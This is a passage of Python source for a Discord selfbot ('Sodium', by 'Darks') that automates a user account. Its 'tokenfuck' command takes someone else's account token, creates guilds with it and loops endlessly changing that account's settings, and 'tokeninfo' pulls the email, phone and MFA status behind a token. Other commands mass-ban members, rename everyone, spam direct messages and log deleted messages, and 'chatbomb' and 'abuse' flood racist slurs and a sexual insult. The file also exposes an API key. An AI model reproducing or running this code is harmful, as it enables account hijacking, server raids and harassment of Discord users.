    await ctx.message.delete()
    await ctx.send(chr(173))

    
#Rename everyone
@darks.command()
async def nickall(ctx, nickname=None):
    await ctx.message.delete()
    if nickname is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {darks.command_prefix}nickall <nickname>')
        return
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass        
        
#Friend commands
#Accept all your friends requests
@darks.command()
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in darks.user.relationships:
        if relationship == discord.RelationshipType.incoming_request:
            await relationship.accept()

#Ignore all your friends requests
@darks.command()
async def ignorefriends(ctx):
    await ctx.message.delete()
    for relationship in darks.user.relationships:
        if relationship is discord.RelationshipType.incoming_request:
            relationship.delete()

#Decline all your friends requests
@darks.command()
async def delfriends(ctx):
    await ctx.message.delete()
    for relationship in darks.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.delete()

#Clear all blocked users
@darks.command()
async def clearblocked(ctx):
    await ctx.message.delete()
    print(darks.user.relationships)
    for relationship in darks.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()


#Group commands
#Kick all users from group
@darks.command()
async def kickgc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)        
        
        
        
        
   # SMUG
@darks.command()
async def smug(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author
    try:        
        r = requests.get("https://nekos.life/api/v2/img/smug")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
       
        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} SMUG {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_smug.gif"))

        print(f"[+] SMUG SUCCESSFUL: {ctx.author} Smug {user}")
    except Exception as e:
        print(f"[-] Error during SMUG command: {e}")

#HUG
@darks.command()
async def hug(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()
    
    if user is None:
        user = ctx.author
    try:        
        r = requests.get("https://nekos.life/api/v2/img/hug")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} HUG {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_hug.gif"))

        print(f"[+] HUG SUCCESSFUL: {ctx.author} Hug {user}")
    except Exception as e:
        print(f"[-] Error during HUG command: {e}")    
    
    
# GAYRATE
@darks.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def gayrate(ctx, User: discord.Member = None):
    if User is None:
        await ctx.reply(f"- **[+]** `PROVIDE A USER`")
    else:
        await ctx.reply(f"> {User.mention} IS {random.randrange(101)}% GAY")
        print(f"{Fore.GREEN}[+] GAYRATE MEASURED SUCCESFULLY😂 ")    
    
    
# CHECK PROMO
@darks.command()
async def checkpromo(ctx, *, promo_links):
    links = promo_links.split('\n')

    async with aiohttp.ClientSession() as session:
        for link in links:
            promo_code = extract_promo_code(link)
            if promo_code:
                result = await check_promo(session, promo_code)
                await ctx.send(result)
            else:
                await ctx.send(f'- `INAVLID PROMO{link}`')

from dateutil import parser

async def check_promo(session, promo_code):
    url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

    async with session.get(url) as response:
        if response.status in [200, 204, 201]:
            data = await response.json()
            if data["uses"] == data["max_uses"]:
                return f'- `ALREADY CLAIMED {promo_code}`'
            else:
                try:
                    now = datetime.datetime.utcnow()
                    exp_at = data["expires_at"].split(".")[0]
                    parsed = parser.parse(exp_at)
                    days = abs((now - parsed).days)
                    title = data["promotion"]["inbound_header_text"]
                except Exception as e:
                    print(e)
                    exp_at = "- `FAILED TO FETCH`"
                    days = ""
                    title = "- `FAILED TO FETCH`"
                return f'- `VALID {promo_code} | DAYS LEFT IN EXPIRATION {days} | EXPIRES AT {exp_at} | TITLE :{title}`'
        elif response.status == 429:
            return f'- `RATE LIMITED{response.headers["RETRY AFTER"]} SECONDS`'
        else:
            return f'- `INVALID : {promo_code}`'        
        
# BOOST
@darks.command(aliases=['sbc'])
async def send_boost_count(ctx):
    guild = ctx.guild 
    channel = ctx.channel 

    await channel.send(
        f"** ⌬・** __**{guild.name}**__ **\n**[+]・Server has :** `{guild.premium_subscription_count} BOOSTS`\n**[+]・__D A R K S__** **"
    )

# SNIPE 
@darks.event
async def on_message_delete(message):
    if message.author.id == darks.user.id:
        return
    if darks.msgsniper:
        # if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel): \\ removed so people cant get you disabled
        if isinstance(message.channel, discord.DMChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(darks.sniped_message_dict) > 1000:
        darks.sniped_message_dict.clear()
    if len(darks.snipe_history_dict) > 1000:
        darks.snipe_history_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        darks.sniped_message_dict.update({channel_id: message_content})
        if channel_id in darks.snipe_history_dict:
            pre = darks.snipe_history_dict[channel_id]
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            darks.snipe_history_dict.update({channel_id: pre[:-3] + post + "\n```"})
        else:
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            darks.snipe_history_dict.update({channel_id: "```\n" + post + "\n```"})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(message.content) + "\n\n**Attachments:**\n" + links
        darks.sniped_message_dict.update({channel_id: message_content})

@darks.event
async def on_message_edit(before, after):
    if before.author.id == darks.user.id:
        return
    if darks.msgsniper:
        if before.content is after.content:
            return
        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**_BEFORE_**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**_AFTER_**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(darks.sniped_edited_message_dict) > 1000:
        darks.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**_BEFORE_**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**_AFTER_**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        darks.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        darks.sniped_edited_message_dict.update({channel_id: message_content})    
    
# SAD QUOTE
@darks.command(name="sadquote", aliases=["sq"])
async def sad_quote(ctx):
    quotes = [
"Sometimes, you have to accept the fact that some people only enter your life as a temporary happiness.",

"The hardest part about walking away from someone is knowing that they won't run after you.",

"The sad truth is that some people are meant to stay in your heart but not in your life.",

"Not all scars show, not all wounds heal. Sometimes you can't see the pain that someone feels.",

"It's sad when you realize you aren't as important to someone as you thought you were.",

"One of the hardest things you will ever have to do is grieve the loss of a person who is still alive.",

"Sometimes, you have to give up on people, not because you don't care, but because they don't.",

"The sad truth is that you can still love someone and be disappointed in them.",

"You can't force someone to care about you. You can only sit and wonder why they don't.",

"Sometimes, the person you want the most is the person you're best without.",

"The saddest thing about betrayal is that it never comes from your enemies, but from those you trust the most.",

"It hurts when you realize you aren't as important to someone as you thought you were.",

"The truth hurts, but the lies are what kill you.",

"The sad truth is that some people will never change, no matter how much you want them to.",

"The deepest wounds are often the ones no one can see.",

"It's sad when you realize you were just a chapter in someone else's story, but they were your whole book.",

"The worst feeling is pretending you don't care about something when it's all you seem to think about.",

"Sometimes, the person who broke you is the only one who can fix you.",

"It's sad how people claim to care about you, but they don't make an effort to stay in your life.",

"The truth is, everyone is going to hurt you. You just have to find the ones worth suffering for.",

"It's sad when you realize you've become an option when you used to be a priority.",

"The saddest kind of sad is when your tears can't even drop and you feel nothing.",

"When you give someone your whole heart and they don't want it, you can't take it back. It's gone forever.",

"The hardest part about walking away from someone is the part where you realize that, no matter how slowly you go, they will never run after you.",

"You can't change how people feel about you, so don't try. Just live your life and be happy.",

"It's sad when you realize that you were worth more than they were willing to give.",

"Sometimes, it's easier to pretend you don't care than to admit that it's killing you.",

"The sad truth is that some people are so used to being hurt that they no longer know what it feels like to be loved.",

"It hurts when you realize you weren't as important to someone as you thought you were.",

"The saddest thing about love is that it's not enough to save someone if they don't want to be saved.",

"The truth is, everyone is going to hurt you. You just have to decide who is worth the pain.",

"It's sad when someone you know becomes someone you knew.",

"The saddest kind of sadness is when you try to explain why you're sad but nothing can come out.",

"You can't make someone feel something they don't, no matter how hard you try.",

"The sad truth is that some people are meant to teach you a lesson, not to be in your life forever.",

"Sometimes, you have to let go of the one you love to find yourself.",

"It's sad when you realize you were just a temporary fix for someone's loneliness.",

"The hardest thing to do is watch the one you love, love someone else.",

"It's sad when you can feel your heart breaking and you can't do anything about it.",

"The truth hurts, but it's better to know than to live in a lie.",

"It's sad when you realize you were never really loved. You were just a convenience.",

"The saddest thing is when you are feeling real down, you look around and realize that there is no shoulder for you.",

"Sometimes, you have to accept that some people are not meant to be in your future.",

"It hurts when you realize you were just an option, not a priority.",

"The sad truth is that some people will only love you as long as you fit into their box.",

"When you lose someone, it's like hearing a loud noise when everything is silent.",

"It's sad when you realize you were the only one putting effort into the relationship.",

"The hardest part of moving forward is not looking back.",

"It's sad when the person who gave you the best memories becomes a memory.",

"The truth is, you can't change someone who doesn't see an issue in their actions.",

"It's sad when you realize you were just a game to someone.",

"The saddest thing is when you're feeling down, you look around, and there's no one there to uplift you."
    ]
    quote = random.choice(quotes)
    await ctx.send(f":broken_heart: {quote}")
    await ctx.message.delete()    
    
#purge   
@darks.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == darks.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@darks.command()
async def clear(ctx, amount=5):
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount)    
        
@darks.command()
async def scrapemessages(ctx, number: int):
    channel = ctx.channel

    
    if number <= 0 or number > 10000:
        await ctx.send("Please provide a valid number between 1 and 10,000.")
        return
    
    try:
        messages = []
        async for message in channel.history(limit=number):
            messages.append(f"{message.author}: {message.content}")

        
        content = "\n".join(messages)

        
        with open("scraped-messages.txt", "w", encoding="utf-8") as file:
            file.write(content)

        
        await asyncio.sleep(1)  
        with open("scraped-messages.txt", "rb") as file:
            await ctx.send(file=discord.File(file, filename="scraped-messages.txt"))
    except discord.Forbidden:
        await ctx.send("I don't have permission to access the channel.")
    except discord.HTTPException:
        await ctx.send("An error occurred while fetching messages.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
        
# LOCK CHANNEL
@darks.command()
@commands.has_permissions(manage_channels=True)
async def lock(ctx, channel:discord.TextChannel=None):
    channel = channel or ctx.channel
    overwrite = channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = False
    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send(ctx.channel.mention + ' SUCCESSFULLY LOCKED ', delete_after=deltimer)

# UNLOCK CHANNEL
@darks.command()
@commands.has_permissions(manage_channels=True)
async def unlock(ctx, channel:discord.TextChannel=None):
    channel = channel or ctx.channel
    overwrite = channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = True
    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send(ctx.channel.mention + ' SUCCESSFULLY UNLOCKED ', delete_after=deltimer)

# HIDE CHANNEL
@darks.command()
@commands.has_permissions(manage_channels=True)
async def hide(ctx, channel:discord.TextChannel=None):
    channel = channel or ctx.channel
    overwrite = channel.overwrites_for(ctx.guild.default_role)
    overwrite.view_channel = False
    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send(ctx.channel.mention + ' SUCCESSFULLY HIDE ', delete_after=deltimer)

# UNHIDE CHANNEL 
@darks.command()
@commands.has_permissions(manage_channels=True)
async def unhide(ctx, channel:discord.TextChannel=None):
    channel = channel or ctx.channel
    overwrite = channel.overwrites_for(ctx.guild.default_role)
    overwrite.view_channel = True
    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send(ctx.channel.mention + ' SUCCESSFULLY UNHIDE ', delete_after=deltimer)    
    
# hypesquad badge
@darks.command(aliases=["changehypesquad"])
async def hypesquad(ctx, house):
	request = requests.Session()
	headers = {
        'Authorization': Duudu,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
	if house == "bravery":
		payload = {'house_id': 1}
	elif house == "brilliance":
		payload = {'house_id': 2}
	elif house == "balance":
		payload = {'house_id': 3}
	elif house == "random":
		houses = [1, 2, 3]
		payload = {'house_id': random.choice(houses)}
	request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
   

@darks.command(aliases=["pornhublogo", "phlogo"])
async def pornhub(ctx, word1=None, word2=None):
    await ctx.message.delete()
    if word1 is None or word2 is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace(
        "{text-1}", word1).replace("{text-2}", word2)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"unknown_pornhub_logo.png"))
    except:
        await ctx.send(endpoint)
        
        
# massreact
@darks.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)       
    
    
# TOKEN FUCK
@darks.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent':
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type':
        'application/json',
        'Authorization':
            _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Darks",
        'region': "europe"
    }
    for _i in range(50):
        requests.post(
            'https://discordapp.com/api/v6/guilds',
            headers=headers,
            json=guild)
    while True:
        try:
            request.patch(
                "https://canary.discordapp.com/api/v6/users/@me/settings",
                headers=headers,
                json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch(
                    "https://canary.discordapp.com/api/v6/users/@me/settings",
                    headers=headers,
                    json=setting,
                    timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break    
    
# Command: Enable auto-responding feature
@darks.command()
async def autoresponseenable(ctx):
    darks.auto_respond_dm_enabled = True
    await ctx.send("- `AUTO-RESPONDING ENABLED`")
    await ctx.message.delete()

# Command: Disable auto-responding feature
@darks.command()
async def autoresponsedisable(ctx):
    darks.auto_respond_dm_enabled = False
    await ctx.send("- `AUTO RESPONDING DISABLED`")
    await ctx.message.delete()    
    
    
# DYNO BAN
@darks.command()
async def dynoban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)
        
        
@darks.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in darks.guilds:
        await guild.ack()    
    
    
# SUPPORT
@darks.command()
async def support(ctx):
    message = '-  **CONTACT HERE FOR ANY SUPPORT :**\n\n`• INSTAGRAM` **: darks_hu_bkl** \n`• DISCORD`   **: darks.4sure.**\n`• DISCORD SERVER`   **: https://discord.gg/pakvillage**'
    await ctx.send(message)
    await ctx.message.delete()
    
    # CENSOR
@darks.command()
async def censor(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')    
      
#SERVER RENAME
@darks.command(aliases=["renameserver", "rs"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)      
    
    
@darks.command(pass_context=True)
async def afk(ctx, mins: int = 5, *, reason=None):
    current_nick = ctx.author.nick
    await ctx.send(f"{ctx.author.mention} is AFK - {reason}")
    await ctx.author.edit(nick=f"[AFK] {ctx.author.display_name}")

    counter = 0
    while counter < mins:
        counter += 1
        await asyncio.sleep(20)

    await ctx.author.edit(nick=current_nick)
    await ctx.send(f"{ctx.author.mention} is no longer AFK")
    
    
# HACK2 
@darks.command()
async def hack2(ctx, member:discord.User = None):
    message = await ctx.send(f"Hacking {member.name} now...")
    await asyncio.sleep(1)

    await message.edit(content= f"Finding discord login...(2fa bypassed)")
    await asyncio.sleep(2)
    
    await message.edit(content=f"Fetching dms with closest friends (if you got any init)")
    await asyncio.sleep(2)

    await message.edit(content=f"Finding most common Word...")
    await asyncio.sleep(2)

    await message.edit(content=f"Injecting virus into the discriminator #{member.discriminator}")
    await asyncio.sleep(2)

    await message.edit(content=f"Virus injected. Nitro stolen")
    await asyncio.sleep(2)

    await message.edit(content=f"Setting up Nintendo account...")
    await asyncio.sleep(2)

    await message.edit(content=f"Hacking Nintendo account...")
    await asyncio.sleep(2)

    await message.edit(content=f"Finding IP address...")
    await asyncio.sleep(2)

    await message.edit(content=f"**IP Address**: 127.0.0.1")
    await asyncio.sleep(2)

    await message.edit(content=f"Stealing data from the scary Goverment...")
    await asyncio.sleep(2)

    await message.edit(content=f"Reporting account to discord for breaking TOS...")
    await asyncio.sleep(2)

    await message.edit(content=f"Hacking your Google history...")
    await asyncio.sleep(2)

    await message.edit(content=f"""Finished hacking {member.name}
The **scary** and dangerous hack is complete""")
    await asyncio.sleep(2)    
    
    
    
# BOTS COUNT
@darks.command()
async def bots(ctx):
    await ctx.message.delete()
    bots = []
    for member in ctx.guild.members:
        if member.bot:
            bots.append(
                str(member.name).replace("`", "\`").replace("*", "\*").replace(
                    "_", "\_") + "#" + member.discriminator)
    bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
    await ctx.send(bottiez)    
    
    
# CHANGE PREFIX   
@darks.command()
async def changeprefix(ctx,*,prefix2):
    darks.command_prefix = str(prefix2)
    await ctx.message.delete()
    await ctx.send(f"```Prefix Changed Successfully! New Prefix is {prefix2}```")    
    
# UNBAN ALL
@darks.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass    

@darks.command(aliases=['info', 'stats'])
async def selfbot(ctx):
    version = "**SODIUM V1**"
    language = "**Python**"
    author = "**D A R K S**"
    total_commands = len(darks.commands)
    server_link = "https://discord.gg/pakvillage"

    
    ram_info = psutil.virtual_memory()
    total_ram = round(ram_info.total / (1024 ** 3), 2)  
    used_ram = round(ram_info.used / (1024 ** 3), 2)  

    
    os_info = platform.platform()

    message = f"**__SODIUM S3LFB0T__**\n\n" \
              f"**• Vers: {version}**\n" \
              f"**• Lang: {language}**\n" \
              f"**• Created By: {author}**\n" \
              f"**• Total Cmds: {total_commands}**\n" \
              f"**• Used RAM: {used_ram} GB**\n" \
              f"**• Total RAM: {total_ram} GB**\n" \
              f"**• Operating System: {os_info}**\n\n" \
              f"**• Server: {server_link}**"

    await ctx.send(message)        
        
        
        
@darks.command()
async def listar(ctx):
    autoresponder_data = load_autoresponder_data()
    if autoresponder_data:
        response = 'Autoresponders:\n'
        for trigger, response_text in autoresponder_data.items():
            response += f'`{trigger}` -> `{response_text}`\n'
        await ctx.send(response)
    else:
        await ctx.send('No autoresponders found.')
        
# TOKEN INFO
@darks.command()
async def tokeninfo(ctx, token2):
    await ctx.message.delete()
    poppe = requests.get("https://discord.com/api/v9/users/@me", headers = {"Authorization": token2}).json()
    username = poppe["username"] + "#" + poppe["discriminator"]
    user_id = poppe["id"]
    locale = poppe["locale"]
    email = poppe["email"]
    phone = poppe ["phone"]
    mfa = poppe["mfa_enabled"]
    await ctx.send(f"""```
{username} info:

ID: {user_id}
Locale: {locale}
Email: {email}
Phone: {phone}    
MFA: {mfa}   
```""")        
        
        
# UNFRIEND
@darks.command()
async def unfriend(ctx, *, user: discord.User):
    await user.remove_friend()
    await ctx.reply("**Friend Has Been Removed**\n\n __**Sodium SelfbotX Darks**__")


@darks.command(name='cb')
async def chatbomb(ctx):
    messages = [
        "**HUSHHHH**", "**HUSHHH**", "**N!GGA SH!TUP**", "**HUSHHH HUSHHHHH LIL KIDD**", "**UR FATHER IS HERE**",
        "*HUSHHHHH KID**", "**F!CKING NASTY AS$ B!TCH**", "**HUSHHHHHHHH F!CKING N!GGA SH!T UR MOUTH**", "**F!CKING NA$TY**", "**HUSHHHHHHHHHHHHHHHHH KID NIGGA**",
        "**B!TCH**", "**AS NIGGA**", "**HUSHHHH F!CKING KID!**", "**SHUT YOUR MOUTH N!GGA**", "**KID SHUT YOUR MOUTH**",
        "**N!GGA F!KING AS$ B!TCH KID!**", "**SHUT YOUR MOUTH BITCH ASS D!CK**", "**D!MB MOTHER F!KER B!CH**", "**AS$ NIGGA I AM UR FATHERS**", "**SHUT UR MOUTH D!MBASS BOMBBB**"
    ]
    
    # Create tasks for sending messages
    tasks = [ctx.send(message) for message in messages]
    await asyncio.gather(*tasks)  # Send all messages at once

   
    
# USER BANNER
@darks.command()
async def user_banner(ctx, user:discord.Member):
    if user == None:
        user = ctx.author
    req = await darks.http.request(discord.http.Route("GET", "/users/{uid}", uid=user.id))
    banner_id = req["banner"]
    # If statement because the user may not have a banner
    if banner_id:
        banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
    await ctx.reply(f"**GUYCHH LINK PE CLICK KARO ANIMATE KE LIYE {banner_url}**", mention_author=True)        
        
# ALL GUILD LEAVE
@darks.command(aliases=['la'])
async def leaveall(ctx):
 while True:
  for guilds in darks.guilds:
   try:
    await guilds.leave()
    await ctx.send(f"left {guilds}")
   except:
       await ctx.send(f"couldnt leave {guilds}")

# SINGLE GUILD LEAVE
@darks.command(aliases=["leaveg","guildleave"])
async def leaveguild(ctx, *, guild: discord.Guild = None):
    #if ctx.author.id in is_bot_owner:
    if guild is None:
        print("Please enter the guild ID!")  # No guild found
        return
    await guild.leave()  # Guild found
    await ctx.send(f"**I left: {guild.name}!**")
    
# ALL GUILDS ID
@darks.command()
async def guildsid(ctx):
    for guild in darks.guilds:
            await ctx.send(f"**{guild.name} | {guild.id}**")        
        
# ABUSE
@darks.command()
async def abuse(ctx):
    message = 'hijarchodh teri mummy ki chut me loda mera teri mumm ki chut aisi marunga behen ke lode gnd chud jayegi teri bhosdike aukat se rahle madarjaat ke pille na to jhaant phadh chudai karunga behenchode rndwwa saala baap se bakchodi pel ra behen ka loda bhosdike teri mummy ki chut maru ghapa ghap ghapa ghap bhosda saala rndi panga na lelio phirse warna ptak ke codh dunga behenchode saale teri maa ka bhosda faad dunga phir wo royegi beth ke behen ki lodi saali chutadi saala chutiyapa karega behen ka loda lund lele baap ka behen ke lodechutadin aale rndwe pille bhosde teri mummy ki chut me loda daalu 10 baar teri mummy chodu 50 baar rndi ke pille aukat na ho to 121 karne ki jurat na ho jai bahin choda saala beta tumhara papa aniket 1021 karke betha hai tum jaiso ko loda chusvata hu behenchodo tumhari mummy ko lund pe jhulata hu saalo rndi ko pillo khandan chud jayega tumhara mujhse 121 karne me behene ke lode mujhse bhidenge'
    await ctx.send(message)
    await ctx.message.delete()        
        
@darks.command(aliases=['247'])
async def connectvc(ctx, channel_id):
    try:
        channel = darks.get_channel(int(channel_id))

        if channel is None:
            return await ctx.send("Invalid channel ID. Please provide a valid voice channel ID.")

        if isinstance(channel, discord.VoiceChannel):
            permissions = channel.permissions_for(ctx.guild.me)

            if not permissions.connect or not permissions.speak:
                return await ctx.send("I don't have permissions to connect or speak in that channel.")

            voice_channel = await channel.connect()
            await ctx.send(f"Connected to voice channel: {channel.name}")

            await channel.send("Hello, I have connected to this voice channel!")

        else:
            await ctx.send("This is not a voice channel. Please provide a valid voice channel ID.")
    except discord.errors.ClientException:
        await ctx.send("I'm already connected to a voice channel.")
    except discord.Forbidden:
        await ctx.send("I don't have permission to perform this action.")
    except ValueError:
        await ctx.send("Invalid channel ID. Please provide a valid voice channel ID.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")        
        
        
@darks.command()
async def weather(ctx, *, city: str):
    api_key = "c9f448f65cda132e2f1c4ca0ea2667aa"  # Replace with your OpenWeatherMap API Key
    base_url = "http://api.openweathermap.org/data/2.5/weather?"

    complete_url = base_url + "appid=" + api_key + "&q=" + city

    response = requests.get(complete_url)
    data = response.json()

    if data["cod"] != "404":
        main = data['main']
        temperature = main['temp']
        humidity = main['humidity']
        pressure = main['pressure']
        weather_report = data['weather']

        await ctx.send(f"Temperature : {temperature} \nHumidity : {humidity}% \nPressure : {pressure} hPa \nDescription : {weather_report[0]['description']}")
    else:
        await ctx.send("City Not Found!")        
        
        
        
# MODERATOR COMMANDS

@darks.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member:discord.Member, *, reason=None):
    await ctx.message.delete()
    await member.ban(reason=reason)

@darks.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member:discord.Member, *, reason=None):
    await ctx.message.delete()
    await member.kick(reason=reason)

@darks.command()
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, member:discord.Member, role:discord.Role):
    await ctx.message.delete()
    await member.add_roles(role)

@darks.command()
@commands.has_permissions(manage_roles=True)
async def takerole(ctx, member:discord.Member, role:discord.Role):
    await ctx.message.delete()
    await member.remove_roles(role)


@darks.command(aliases=[])
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
        darks.msgsniper = True
        await ctx.send(f'{darks.user.name}Message-Sniper is now **enabled**')
    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
        darks.msgsniper = False
        await ctx.send(f'{darks.user.name}Message-Sniper is now **disabled**')
        
@darks.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
  await ctx.message.delete()
  await darks.create_guild(f'backup-{ctx.guild.name}')
  await asyncio.sleep(4)
  for g in darks.guilds:
    if f'backup-{ctx.guild.name}' in g.name:
      for c in g.channels:
        await c.delete()
      for cate in ctx.guild.categories:
        x = await g.create_category(f"{cate.name}")
        for chann in cate.channels:
          if isinstance(chann, discord.VoiceChannel):
            await x.create_voice_channel(f"{chann}")
          if isinstance(chann, discord.TextChannel):
            await x.create_text_channel(f"{chann}")
  try:
    await g.edit(icon=ctx.guild.icon_url)
  except:
    pass

@darks.command()
async def dmlist(ctx, *, x):
    await ctx.message.delete()
    for channel in darks.private_channels:
        try:
            await channel.send(x)
            print(f"DMd {channel}")
        except:
            print(f"Can't DM {channel}")
            continue
        
        
        
# QUICK DELETE
@darks.command(aliases=["quickdel", "ghostping"])
async def quickdelete(ctx, *, args):
    await ctx.message.delete()
    await ctx.send(args, delete_after=1)        
        
        
@darks.command(aliases=["sbi"])
async def ssb(ctx):
    lol = (
        "**```yml\n"
        "!    Sodium SELF BOT    !\n```"
        "```js\n"
        "- VERSION => Sodium SELFBOT V1\n"
        "- LANG => PYTHON\n"
        f"- REQUEST CREATOR => {darks.user.name}\n"
